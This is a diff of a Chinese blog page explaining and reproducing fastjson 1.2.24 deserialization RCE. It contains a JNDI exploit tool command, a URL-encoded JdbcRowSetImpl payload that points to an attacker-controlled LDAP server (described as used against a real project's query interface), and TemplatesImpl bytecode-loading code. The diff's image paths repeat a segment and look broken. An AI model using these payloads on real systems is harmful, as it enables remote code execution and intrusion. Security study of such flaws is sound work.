@@ -129,16 +129,27 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
 
 <p>​      右键点击pom.xml文件,依次选择[maven]–&gt;[Download Sources  and Documentations]下载 配置文件中的依赖项</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109152657979.png" alt="image-20211109152657979"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109152657979.png" class title="image-20211109152657979">
+
+
+
 <ul>
 <li><p>导入jar包</p>
 <p>首先在maven repository中找到下载的jar包地址</p>
 <p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.alibaba/fastjson">下载地址</a></p>
 </li>
 </ul>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153634446.png" alt="image-20211109153634446"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153634446.png" class title="image-20211109153634446">
+
+
+
 <p>​      在仓库中找到所要下载的fastjson版本(这里选用fastjson1.2.24)</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153743931.png" alt="image-20211109153743931"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153743931.png" class title="image-20211109153743931">
+
+
+
+
+
 <h2 id="序列化-反序列化"><a href="#序列化-反序列化" class="headerlink" title="序列化/反序列化"></a>序列化/反序列化</h2><hr>
 <p>为了更清晰的了解Fastjson中JSON字符串和对象的转换，使用IDE简单验证fastjson的序列和反序列</p>
 <h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><hr>
@@ -150,7 +161,10 @@
 
 <p>运行结果:</p>
 <p>可以看到将java对象使用JSON序列化(JSON.tojsonstring())转换为Json字符串</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109155435748.png" alt="image-20211109155435748"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109155435748.png" class title="image-20211109155435748">
+
+
+
 <h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><hr>
 <p>fastjson反序列化自动调用对应对象类中的setxxx()方法，将JSON字符串中的属性及其对应值通过对象类中的setxx()方法实例化</p>
 <p>比如JSON字符串 {“age”:66,”username”:”test”}反序列化User类</p>
@@ -161,7 +175,10 @@
 
 <p>运行结果:</p>
 <p>可以看到运行结果中输出了setxxx()方法中的字符串。所以在反序列化中JSON.parseObject(json，对象类名.class)自动调用了setxxx()方法，</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109161833326.png" alt="image-20211109161833326"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109161833326.png" class title="image-20211109161833326">
+
+
+
 <p>这里的反序列化使用的是<code>parseObject()</code>方法，其实也可以用到<code>parse()</code>方法，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但<code>parseObject()</code> 会将Java对象转为 <code>JSONObject</code>对象，即<code>JSON.toJSON()</code>.</p>
 <p>parseObject()和parse()最主要的区别就是前者返回的是<code>JSONObject</code>，而后者会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，返回的是实际类型的对象.当在没有对应类的定义的情况下（没有在<code>@type</code>声明类），通常情况下都会使用<code>JSON.parseObject</code>来获取数据。</p>
 <p>由于<code>JSON.parseObject()</code>要反序列化到<strong>对应的对象（比如demo中的User类对象，需要将第二个参数设置为<code>User.class</code>）</strong>才会触发类的<code>setXXX</code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）。那要怎么处理才能让<code>JSON.parseObject()</code>在调用时，不输入第二个参数也能执行<code>setXXX</code>方法呢？我们使用parse()方法中下@type指定转换的类。</p>
@@ -173,7 +190,10 @@
 <p>运行结果:</p>
 <p>由于json1字符串未指定转换的对象类，没有调用setxxx()方法；而json2字符串使用了@type指定了所要转换的对象类，则调用了setxxx()方法。</p>
 <p>可见<code>@type</code>参数的作用就是指定json字符串要反序列化的对象类。就是这个类让我们可以进行漏洞利用</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109170634344.png" alt="image-20211109170634344"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109170634344.png" class title="image-20211109170634344">
+
+
+
 <p>相关知识:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig类：</span><br><span class="line">配置反序列化信息</span><br><span class="line"></span><br><span class="line">Autotype：</span><br><span class="line">Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。</span><br><span class="line"></span><br><span class="line">AutoType安全校验流程,假设如下场景，</span><br><span class="line">​ 服务端接收到的请求Json串中包含了指定恶意代码Class的@Type，</span><br><span class="line">​ 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码</span><br><span class="line"></span><br><span class="line">AutoType黑名单机制：</span><br><span class="line">在反序列化时，会校验指定的class是否在黑名单中，若在，则抛出异常</span><br><span class="line"></span><br><span class="line">Safemode机制：</span><br><span class="line">配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。</span><br></pre></td></tr></table></figure>
 
@@ -217,28 +237,51 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java   -jar   JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar     -A 127.0.0.1     -C &quot;calc&quot;</span><br><span class="line"></span><br><span class="line"> -A     指定监听地址</span><br><span class="line"> -C     执行的命令</span><br></pre></td></tr></table></figure>
 
 <p>可以看到命令成功执行</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" alt="image-20211110110216214"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" class title="image-20211110110216214">
+
+
+
+
+
 <h4 id="实战利用-这里的fastjson版本为1-2-21"><a href="#实战利用-这里的fastjson版本为1-2-21" class="headerlink" title="实战利用(这里的fastjson版本为1.2.21)"></a>实战利用(这里的fastjson版本为1.2.21)</h4><hr>
 <p>在做某基金项目时公司前辈使用fastjson反序列化实现了RCE，所以下来对该漏洞进行了复现</p>
 <p>这是漏洞触发点，可以看到是个查询接口</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111211609793.png" alt="image-20211111211609793"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111211609793.png" class title="image-20211111211609793">
+
+
+
 <p>该查询接口发现使用query参数(query_list)，将query参数格式设置为错误格式，比如删除其中的中括号或花括号</p>
 <p>这里删掉啦最后的花括号，可以看到报错返回fastjson版本为1.2.41</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111212405478.png" alt="image-20211111212405478"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111212405478.png" class title="image-20211111212405478">
+
+
+
 <p>这里使用dnslog来验证是否命令执行成功</p>
 <p>在dnslog平台上获取域名</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111215010686.png" alt="image-20211111215010686"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111215010686.png" class title="image-20211111215010686">
+
+
+
 <p>将JNDIExpoit工具放到自己的公网服务器上，并开启IDAP和RMI服务(注意jdk版本)</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111220410004.png" alt="image-20211111220410004"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111220410004.png" class title="image-20211111220410004">
+
+
+
 <p>构造query参数加载jdbcSetRowimpl类设置dataSourceName为指定的LDAP服务或者RMI服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%22ss%22:%7B%22@type%22:%22com.alibaba.fastjson.JSONObject%22,%7B%0A%20%20%20%20%22a%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22java.lang.Class%22,%0A%20%20%20%20%20%20%20%22val%22:%22com.sun.rowset.jdbcRowSetimpl%22%0A%20%20%20%20%7D,%0A%20%20%20%20%22b%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22com.sun.rowset.jdbcRowSetimpl%22,%0A%20%20%20%20%20%20%20%22dataSourceName%22:%22idap://公网服务器ip地址:1389/do9ouu%22,%0A%20%20%20%20%20%20%20%22autoCommit%22:true%0A%20%20%20%20%7D%0A%7D%7D</span><br></pre></td></tr></table></figure>
 
 
 
 <p>构造的json利用poc如下:</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221213814.png" alt="image-20211111221213814"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221213814.png" class title="image-20211111221213814">
+
+
+
 <p>发包后可看到dnslog上有DNS解析，证明命令执行成功</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221622063.png" alt="image-20211111221622063"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221622063.png" class title="image-20211111221622063">
+
+
+
 <p>命令执行也可以设置为反弹shell造成RCE。</p>
 <h3 id="Templatesimpl利用链"><a href="#Templatesimpl利用链" class="headerlink" title="Templatesimpl利用链"></a>Templatesimpl利用链</h3><hr>
 <h4 id="利用流程-1"><a href="#利用流程-1" class="headerlink" title="利用流程"></a><strong>利用流程</strong></h4><p>思路如下；</p>
@@ -255,9 +298,15 @@
 
 
 <p>使用javac.exe将java源代码编译成字节码，成功.class文件</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112112456462.png" alt="image-20211112112456462"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112112456462.png" class title="image-20211112112456462">
+
+
+
 <p>我们使用工具查看编译成的二进制文件(hexdump或者一些编辑器)</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112142345785.png" alt="image-20211112142345785"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112142345785.png" class title="image-20211112142345785">
+
+
+
 <p>将上面编译得到的字节码进行base64编码加密，加载编译得到的class文件</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loadclasstest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Users\\Administrator\\IdeaProjects\\fastjson_Demo\\src\\main\\java\\org\\example\\Templetapoc.class&quot;</span>));</span><br><span class="line">        String bytecode = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(bytecode);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -280,7 +329,10 @@
 <p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类。 </p>
 <p>outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>
 <p>运行结果；</p>
-<p><img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112205132938.png" alt="image-20211112205132938"></p>
+<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112205132938.png" class title="image-20211112205132938">
+
+
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">值得注意的是:</span><br><span class="line">需要开启Feature.SupportNonPublicField，实战中不适用</span><br></pre></td></tr></table></figure>
 
 
